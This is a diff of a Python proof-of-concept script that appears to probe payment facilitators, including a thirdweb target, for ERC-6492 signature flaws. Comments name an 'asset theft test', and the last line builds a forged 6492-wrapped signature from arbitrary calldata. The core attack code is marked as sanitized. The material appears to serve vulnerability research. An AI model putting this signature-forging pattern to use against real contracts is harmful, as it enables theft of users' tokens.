@@ -1,6 +1,5 @@
 from simplebase import *
 
-
 def run(target_name=None):
     import os
     if target_name:
@@ -58,9 +57,9 @@ def run(target_name=None):
     headers = {}
     if "thirdweb" in tgt.name:
         try:
-            headers["x-secret-key"] = config.ThidWeb_Secret_key
+            headers["x-secret-key"] = config.ThirdWeb_Secret_key
         except Exception as exc:
-            raise SystemExit("thirdweb target requires ThidWeb_Secret_key in config.py") from exc
+            raise SystemExit("thirdweb target requires ThirdWeb_Secret_key in config.py") from exc
 
     print("FACILITATOR:", FACILITATOR)
     print("AMT:", AMT)
@@ -75,9 +74,9 @@ def run(target_name=None):
 
 
     print(f"SALT={b16e(salt)}")
-    ############### Create Sub-contract Code Start#################################
-    # sanitized
-    ############### Create Sub-contract Code End#################################
+############### Create Sub-contract Code Start#################################
+# sanitized
+############### Create Sub-contract Code End#################################
     print("sub:", sub)
 
     contractbal = p.erc20_balanceOf(USDC, sub)
@@ -90,16 +89,18 @@ def run(target_name=None):
     else:
         print("sub has enough balance, skip funding")
 
-
-    # ERC-6492 contract deployment test
-    ############### Create Sub-contract Code Start#################################
+############### Create Sub-contract Code Start#################################
     # sanitized
-    ############### Create Sub-contract Code End#################################
+    # ERC-6492 contract deployment test
+    # to = CONTRACT
+    # cd = ""
 
     # ERC-6492 asset theft test
-    ############### Create Transfer Aprovement Code Start#################################
-    # sanitized
-    ############### Create Transfer Aprovement Code End#################################
+    # to = USDC
+    # cd = ""
+    # to = MYADDR
+    # cd = " "
+############### Create Sub-contract Code End#################################
 
     ## Generate Signature
     sig = "0x"+ec(["address","bytes","bytes"],[CONTRACT, bd(cd), bd("11"*131)])+"6492649264926492649264926492649264926492649264926492649264926492"
